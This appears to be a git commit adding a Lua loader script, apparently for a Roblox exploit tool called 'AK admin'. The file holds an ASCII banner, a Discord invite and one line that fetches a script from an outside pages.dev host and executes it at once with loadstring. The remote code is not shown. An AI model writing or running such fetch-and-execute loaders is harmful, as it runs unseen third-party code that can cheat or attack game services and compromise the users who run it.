7d3f72146cb58a27b848ed814cf50b1f177542cc
evilionx3 <182793241+evilionx3@users.noreply.github.com>
2025-05-31 08:26:28 -0800

    Add files via upload

---
+++ akfiles/main.lua
@@ -0,0 +1,15 @@
+--[[
+       d8888 888    d8P 
+      d88888 888   d8P  
+     d88P888 888  d8P   
+    d88P 888 888d88K    
+   d88P  888 8888888b   
+  d88P   888 888  Y88b  
+ d8888888888 888   Y88b 
+d88P     888 888    Y88b
+------------------------------
+discord.gg/akadmin
+]]--
+
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/realmain.lua"))()
+
